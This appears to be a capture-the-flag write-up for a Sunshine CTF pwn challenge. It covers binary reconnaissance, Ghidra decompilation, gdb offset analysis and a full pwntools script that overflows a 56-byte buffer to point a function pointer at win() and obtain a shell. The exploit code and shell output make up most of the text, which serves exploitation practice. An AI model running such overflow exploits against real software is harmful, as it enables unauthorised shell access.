# &#35; chall_04


#### &#42; purpose
1. find offset to input variable(local_48[56]) and *local_10
2. try to overwrite *local_10 with win()


#### &#42; execute
```bash
## 1 file
$ ls ./chall_04
./chall_04

## 64-bit LSB, dynamically linked and not stripped
$ file ./chall_04
./chall_04: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=52ca26c6b659525c1f98d9d3279b910d83db7dc9, for GNU/Linux 3.2.0, not stripped

## Partial RELRO only
$ checksec --file=./chall_04
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68) Symbols	  No	0		1		./chall_04

## just input twice and loop
$ ./chall_04
Like some kind of madness, was taking control.
AAAAAAAA
BBBBBBBB
Like some kind of madness, was taking control.
AAAAAAAA
BBBBBBBB
Like some kind of madness, was taking control.


```

#### &#42; decompile using ghidra
```bash
## vulerable point is fgets(local_48,100,stdin) and (*local_10)() in vuln()
void main(void)

{
  char local_28 [32];
  
  puts("Like some kind of madness, was taking control.");
  fgets(local_28,0x13,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_48 [56];
  code *local_10;
  
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}


## exploit structure
local_48[56] + local_10[win]

```


#### &#42; analysis binary using gdb
```bash

$ gdb ./chall_04 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./chall_04...
(No debugging symbols found in ./chall_04)
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004011c2 <+0>:	endbr64
   0x00000000004011c6 <+4>:	push   rbp
   0x00000000004011c7 <+5>:	mov    rbp,rsp
   0x00000000004011ca <+8>:	sub    rsp,0x20
   0x00000000004011ce <+12>:	lea    rdi,[rip+0xe3b]        # 0x402010
   0x00000000004011d5 <+19>:	call   0x401060 <puts@plt>
   0x00000000004011da <+24>:	mov    rdx,QWORD PTR [rip+0x2e5f]        # 0x404040 <stdin@@GLIBC_2.2.5>
   0x00000000004011e1 <+31>:	lea    rax,[rbp-0x20]
   0x00000000004011e5 <+35>:	mov    esi,0x13
   0x00000000004011ea <+40>:	mov    rdi,rax
   0x00000000004011ed <+43>:	call   0x401080 <fgets@plt>
   0x00000000004011f2 <+48>:	call   0x40118d <vuln>
   0x00000000004011f7 <+53>:	nop
   0x00000000004011f8 <+54>:	leave
   0x00000000004011f9 <+55>:	ret
End of assembler dump.
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x000000000040118d <+0>:	endbr64
   0x0000000000401191 <+4>:	push   rbp
   0x0000000000401192 <+5>:	mov    rbp,rsp
   0x0000000000401195 <+8>:	sub    rsp,0x240
   0x000000000040119c <+15>:	mov    rdx,QWORD PTR [rip+0x2e9d]        # 0x404040 <stdin@@GLIBC_2.2.5>
   0x00000000004011a3 <+22>:	lea    rax,[rbp-0x40]
   0x00000000004011a7 <+26>:	mov    esi,0x64
   0x00000000004011ac <+31>:	mov    rdi,rax
   0x00000000004011af <+34>:	call   0x401080 <fgets@plt>
   0x00000000004011b4 <+39>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004011b8 <+43>:	mov    eax,0x0
   0x00000000004011bd <+48>:	call   rdx
   0x00000000004011bf <+50>:	nop
   0x00000000004011c0 <+51>:	leave
   0x00000000004011c1 <+52>:	ret
End of assembler dump.
gef➤


gef➤  x/16xg 0x00007ffe2caeb710
0x7ffe2caeb710:	0x4242424242424242	0x4242424242424242
0x7ffe2caeb720:	0x4242424242424242	0x4242424242424242
0x7ffe2caeb730:	0x4242424242424242	0x4242424242424242
0x7ffe2caeb740:	0x4242424242424242	0x000000000040000a
0x7ffe2caeb750:	0x00007ffe2caeb780	0x00000000004011f7
0x7ffe2caeb760:	0x4141414141414141	0x000000000040000a
0x7ffe2caeb770:	0x00007ffe2caeb870	0x0000000000000000
0x7ffe2caeb780:	0x0000000000000000	0x00007f5f4e1ac0b3


gef➤  r
Starting program: /pwn/sunshine/04/chall_04
warning: Error disabling address space randomization: Operation not permitted
Like some kind of madness, was taking control.
AAAAAAAA
>>> "A"*56+"B"*6
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB'
>>>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Breakpoint 1, 0x00000000004011b4 in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffc9dcb5ba0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x0000000000401200  →  <__libc_csu_init+0> endbr64
$rcx   : 0x0000000000b986ef  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007ffc9dcb59a0  →  0x0000005d0000006e ("n"?)
$rbp   : 0x00007ffc9dcb5be0  →  0x00007ffc9dcb5c10  →  0x0000000000000000
$rsi   : 0x0000000000b986b1  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00007fcb77f894d0  →  0x0000000000000000
$rip   : 0x00000000004011b4  →  <vuln+39> mov rdx, QWORD PTR [rbp-0x8]
$r8    : 0x00007ffc9dcb5ba0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0x0
$r10   : 0x0000000000400486  →  0x7973007374656766 ("fgets"?)
$r11   : 0x246
$r12   : 0x0000000000401090  →  <_start+0> endbr64
$r13   : 0x00007ffc9dcb5d00  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc9dcb59a0│+0x0000: 0x0000005d0000006e ("n"?)	 ← $rsp
0x00007ffc9dcb59a8│+0x0008: 0x0000000000000000
0x00007ffc9dcb59b0│+0x0010: 0x0000000000000000
0x00007ffc9dcb59b8│+0x0018: 0x000000000000003f ("?"?)
0x00007ffc9dcb59c0│+0x0020: 0x0000000000000400
0x00007ffc9dcb59c8│+0x0028: 0xffffffffffffffb0
0x00007ffc9dcb59d0│+0x0030: 0x0000000000000000
0x00007ffc9dcb59d8│+0x0038: 0x00007ffc9dcb5bf0  →  "AAAAAAAA\n"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011a7 <vuln+26>        mov    esi, 0x64
     0x4011ac <vuln+31>        mov    rdi, rax
     0x4011af <vuln+34>        call   0x401080 <fgets@plt>
 →   0x4011b4 <vuln+39>        mov    rdx, QWORD PTR [rbp-0x8]
     0x4011b8 <vuln+43>        mov    eax, 0x0
     0x4011bd <vuln+48>        call   rdx
     0x4011bf <vuln+50>        nop
     0x4011c0 <vuln+51>        leave
     0x4011c1 <vuln+52>        ret
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_04", stopped 0x4011b4 in vuln (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011b4 → vuln()
[#1] 0x4011f7 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/xg $rbp-0x8
0x7ffc9dcb5bd8:	0x000a424242424242
gef➤


```

#### &#42; structure of stack
```bash
local_48[56] + local_10[win]


```

#### &#42; payload(python)
```python
payload  = b"A"*56
payload += p64(win)

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_04'
conn = process(filename)
elf = ELF(filename)

win = elf.symbols["win"]

print( conn.recvuntil("taking control.\n") )

payload  = b"Z"*4
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload+"\n")

payload  = b"A"*56
payload += p64(win)

conn.send(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_04' in $PATH, using './chall_04' instead
[+] Starting local process './chall_04': pid 2871
[*] '/pwn/sunshine/04/chall_04'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Like some kind of madness, was taking control.

[*] Switching to interactive mode
$
$ cat flag.txt
sun{critical-acclaim-96cfde3d068e77bf}
$

```
